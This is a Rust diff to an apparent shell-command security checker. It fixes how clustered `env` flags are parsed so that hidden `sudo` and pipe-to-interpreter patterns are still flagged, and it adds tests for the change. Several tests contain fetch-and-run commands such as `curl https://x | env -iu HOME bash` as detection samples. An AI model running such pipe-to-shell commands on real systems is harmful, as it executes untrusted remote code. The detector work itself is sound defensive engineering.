@@ -574,7 +574,13 @@ fn args_chain_contains_sudo_env(args: &[String], shell: ShellType, depth: usize)
             continue;
         }
         if normalized.starts_with('-') {
-            if value_short_flags.iter().any(|f| normalized == *f) {
+            // Separate-arg value flag (`-u HOME`) OR a clustered value flag whose
+            // value is the next argv (`-iu HOME`, `-iC /tmp`) consumes the next
+            // token; otherwise (boolean cluster `-iv`, attached value `-uSfoo`)
+            // advance by 1 (CodeRabbit M13 PR #132 round-24).
+            if value_short_flags.iter().any(|f| normalized == *f)
+                || env_short_cluster_consumes_next_argv(&normalized)
+            {
                 idx += 2;
             } else {
                 idx += 1;
@@ -694,6 +700,46 @@ fn attached_env_split_string_command(normalized: &str) -> Option<&str> {
     None
 }
 
+/// `true` when a single-dash `env` short-flag CLUSTER (`-iu`, `-iC`, …) ends with
+/// a value-taking short option whose value is the NEXT argv (so the parser must
+/// advance by 2, not 1). Mirrors the existing `sudo` clustered-flag handling
+/// (`normalized.ends_with(&f[1..])`) but is left-to-right *aware* so an
+/// EARLIER value-taking option in the cluster — which consumes the rest of the
+/// cluster as its ATTACHED value — does NOT trigger a spurious next-argv consume.
+///
+/// Scans the cluster left-to-right for the FIRST value-taking short option
+/// (the single-char names in [`ENV_VALUE_SHORT_FLAGS`], i.e. `-u`/`-C`):
+/// * not found ⇒ the cluster is all boolean flags (`-iv`, `-0`) ⇒ `false`
+///   (no next-argv consumption).
+/// * found and it is the LAST char of the cluster (`-iu`, `-iC`, bare `-u`/`-C`)
+///   ⇒ its value is the next argv ⇒ `true` (advance by 2).
+/// * found but NOT last (`-uSfoo` = `-u` value `Sfoo`; `-Cu` = `-C` value `u`)
+///   ⇒ its value is ATTACHED (the rest of the cluster) ⇒ `false` (advance by 1).
+///
+/// Callers must consult [`attached_env_split_string_command`] FIRST — an
+/// attached/combined `-S…` split-string (`-Sbash`, `-vSbash`) is the payload
+/// form and is handled by the split-string arms, not as a value-flag consume.
+/// `--…` long flags and bare `-` are never clusters and return `false`.
+fn env_short_cluster_consumes_next_argv(normalized: &str) -> bool {
+    if !normalized.starts_with('-') || normalized.starts_with("--") || normalized == "-" {
+        return false;
+    }
+    let flags = &normalized[1..];
+    let value_taking: Vec<char> = ENV_VALUE_SHORT_FLAGS
+        .iter()
+        .filter_map(|f| f.strip_prefix('-').and_then(|s| s.chars().next()))
+        .collect();
+    for (offset, ch) in flags.char_indices() {
+        if value_taking.contains(&ch) {
+            // First value-taking option: its value is the next argv only when it
+            // is the final char of the cluster; otherwise the value is attached
+            // (the rest of the cluster) and no next-argv is consumed.
+            return offset + ch.len_utf8() == flags.len();
+        }
+    }
+    false
+}
+
 /// Tokenize a command-string argument (the body of `env -S "…"`) and report
 /// whether ANY of its segments' wrapper chains contain `sudo`.
 ///
@@ -777,6 +823,11 @@ fn wrapper_first_positional_index(
                 || (wrapper == "sudo"
                     && normalized.len() > 2
                     && value_short.iter().any(|f| normalized.ends_with(&f[1..])))
+                // env clustered value flag whose value is the next argv
+                // (`-iu HOME`, `-iC /tmp`). Left-to-right aware so `-uSfoo`
+                // (attached value) does NOT consume the next argv
+                // (CodeRabbit M13 PR #132 round-24).
+                || (is_env && env_short_cluster_consumes_next_argv(&normalized))
             {
                 idx += 2;
             } else {
@@ -1074,7 +1125,12 @@ fn resolve_base_env(args: &[String], shell: ShellType, depth: usize) -> Option<S
             return resolve_base_from_command_string(cmd, shell, depth - 1);
         }
         if normalized.starts_with('-') {
-            if value_short_flags.iter().any(|f| normalized == *f) {
+            // Separate-arg value flag (`-u HOME`) OR a clustered value flag whose
+            // value is the next argv (`-iu HOME`, `-iC /tmp`) consumes the next
+            // token; otherwise advance by 1 (CodeRabbit M13 PR #132 round-24).
+            if value_short_flags.iter().any(|f| normalized == *f)
+                || env_short_cluster_consumes_next_argv(&normalized)
+            {
                 idx += 2;
             } else {
                 idx += 1;
@@ -1565,7 +1621,13 @@ fn resolve_step_env<'a>(args: &'a [String], shell: ShellType, depth: usize) -> R
             continue;
         }
         if normalized.starts_with('-') {
-            if value_short_flags.iter().any(|f| normalized == *f) {
+            // Separate-arg value flag (`-u HOME`) OR a clustered value flag whose
+            // value is the next argv (`-iu HOME`, `-iC /tmp`) consumes the next
+            // token; otherwise (boolean cluster `-iv`, attached value `-uSfoo`)
+            // advance by 1 (CodeRabbit M13 PR #132 round-24).
+            if value_short_flags.iter().any(|f| normalized == *f)
+                || env_short_cluster_consumes_next_argv(&normalized)
+            {
                 idx += 2;
             } else {
                 idx += 1;
@@ -3540,6 +3602,145 @@ mod tests {
         assert!(
             !extract_command_facts("env -uSfoo bash", ShellType::Posix).uses_sudo,
             "env -uSfoo bash carries no sudo"
+        );
+    }
+
+    #[test]
+    fn test_env_short_cluster_consumes_next_argv() {
+        // CodeRabbit M13 PR #132 round-24: a CLUSTERED env short-flag whose final
+        // char is a value-taking option (`-u`/`-C` from `ENV_VALUE_SHORT_FLAGS`)
+        // takes the NEXT argv as its value, so the parser must advance by 2. The
+        // round-23 parsing only treated EXACT `-u`/`-C` (or attached `-uSfoo`) as
+        // value-taking, missing clustered forms like `-iu`/`-iC`.
+
+        // Clustered value flag as the FINAL char ⇒ consumes next argv (advance 2).
+        for tok in ["-iu", "-iC", "-viu", "-0iu", "-iiu", "-iC", "-u", "-C"] {
+            assert!(
+                env_short_cluster_consumes_next_argv(tok),
+                "{tok:?} ends in a value-taking short flag ⇒ next argv is its value"
+            );
+        }
+
+        // Boolean-only clusters (no value-taking option) ⇒ NO next-argv consume.
+        for tok in ["-i", "-v", "-0", "-iv", "-vi", "-i0v", "-"] {
+            assert!(
+                !env_short_cluster_consumes_next_argv(tok),
+                "{tok:?} is all boolean flags ⇒ no next-argv consume"
+            );
+        }
+
+        // Value-taking option NOT last ⇒ its value is ATTACHED (rest of cluster),
+        // so NO next-argv consume. `-uSfoo` = `-u` value `Sfoo`; `-Cu` = `-C`
+        // value `u`; `-uS` = `-u` value `S` (these are exactly the round-23
+        // attached forms that must keep advancing by 1).
+        for tok in [
+            "-uSfoo", "-CSbar", "-uS", "-CS", "-Cu", "-ux", "-Cdir", "-uXC",
+        ] {
+            assert!(
+                !env_short_cluster_consumes_next_argv(tok),
+                "{tok:?} has an attached value ⇒ no next-argv consume"
+            );
+        }
+
+        // Long flags and bare `-` are never single-dash clusters.
+        for tok in ["--unset", "--chdir", "--split-string", "-", ""] {
+            assert!(
+                !env_short_cluster_consumes_next_argv(tok),
+                "{tok:?} is not a single-dash short-flag cluster"
+            );
+        }
+    }
+
+    #[test]
+    fn test_env_clustered_value_flag_consumes_next_argv_all_paths() {
+        // CodeRabbit M13 PR #132 round-24: a clustered value-taking env short flag
+        // whose value is the NEXT argv (`env -iu HOME bash` ⇒ `-i` clear-env +
+        // `-u HOME` unset; `env -iC /tmp sudo bash` ⇒ `-i` + `-C /tmp` chdir) must
+        // be counted as consuming that argv across ALL four env peel paths, so the
+        // positional command / interpreter resolves correctly and a sudo leader
+        // behind the cluster is still detected. Exercised through the same
+        // `extract_command_facts` entry point the other env tests use.
+
+        // (1) `resolve_interpreter_name` / `resolve_step_env`: the positional
+        // interpreter is `bash`, NOT the unset target `HOME`.
+        let pipe = "curl https://x | env -iu HOME bash";
+        let facts = extract_command_facts(pipe, ShellType::Posix);
+        assert!(
+            facts.pipeline_targets.iter().any(|t| t == "bash"),
+            "env -iu HOME bash: positional interpreter is bash, not HOME (got {:?})",
+            facts.pipeline_targets
+        );
+        assert!(
+            !facts.pipeline_targets.iter().any(|t| t == "home"),
+            "env -iu HOME bash: HOME must not be mistaken for the interpreter (got {:?})",
+            facts.pipeline_targets
+        );
+        let findings = check_default(pipe, ShellType::Posix);
+        assert!(
+            findings
+                .iter()
+                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
+            "env -iu HOME bash on a pipeline RHS must still fire pipe-to-interpreter: {pipe:?}"
+        );
+
+        // (2) `args_chain_contains_sudo_env` / `resolve_base_env` /
+        // `wrapper_first_positional_index`: a `sudo` leader sitting AFTER a
+        // clustered `-iC /tmp` (which consumes `/tmp`) is still detected.
+        for input in [
+            "env -iC /tmp sudo bash",    // -i + -C /tmp, then sudo bash
+            "env -iu HOME sudo bash",    // -i + -u HOME, then sudo bash
+            "env -C /tmp -iu X sudo sh", // separate -C then clustered -iu
+        ] {
+            assert!(
+                extract_command_facts(input, ShellType::Posix).uses_sudo,
+                "clustered env value flag must not hide the sudo leader: {input:?}"
+            );
+        }
+
+        // (3) PRESERVE existing behavior: the separate-arg and attached forms the
+        // round-22/23 work covered must behave EXACTLY as before.
+        // Separate-arg `-u HOME` / `-C /tmp` still skip their value and resolve.
+        for input in ["env -u HOME bash", "env -C /tmp bash", "env -i bash"] {
+            let f = extract_command_facts(&format!("curl https://x | {input}"), ShellType::Posix);
+            assert!(
+                f.pipeline_targets.iter().any(|t| t == "bash"),
+                "separate-arg / boolean env flags must still resolve to bash: {input:?} (got {:?})",
+                f.pipeline_targets
+            );
+        }
+        assert!(
+            extract_command_facts("env -u HOME sudo bash", ShellType::Posix).uses_sudo,
+            "separate -u HOME then sudo bash still detects sudo"
+        );
+        assert!(
+            extract_command_facts("env -C /tmp sudo bash", ShellType::Posix).uses_sudo,
+            "separate -C /tmp then sudo bash still detects sudo"
+        );
+        // Attached `-uSfoo` / combined `-vS'sudo bash'` unchanged (no spurious
+        // next-argv consume / split-string still honored).
+        let attached = extract_command_facts("curl https://x | env -uSfoo bash", ShellType::Posix);
+        assert!(
+            attached.pipeline_targets.iter().any(|t| t == "bash"),
+            "attached -uSfoo bash still resolves the positional bash (got {:?})",
+            attached.pipeline_targets
+        );
+        assert!(
+            extract_command_facts(r#"env -vS'sudo bash'"#, ShellType::Posix).uses_sudo,
+            "combined -vS'sudo bash' split-string still detects sudo"
+        );
+
+        // (4) NEGATIVE: a boolean-only cluster (`-iv`) does NOT consume the next
+        // argv, so the positional command is read correctly and no sudo is
+        // invented.
+        let boolean = extract_command_facts("curl https://x | env -iv bash", ShellType::Posix);
+        assert!(
+            boolean.pipeline_targets.iter().any(|t| t == "bash"),
+            "boolean cluster -iv must not consume bash (got {:?})",
+            boolean.pipeline_targets
+        );
+        assert!(
+            !extract_command_facts("env -iv bash", ShellType::Posix).uses_sudo,
+            "boolean cluster -iv bash carries no sudo"
         );
     }
 
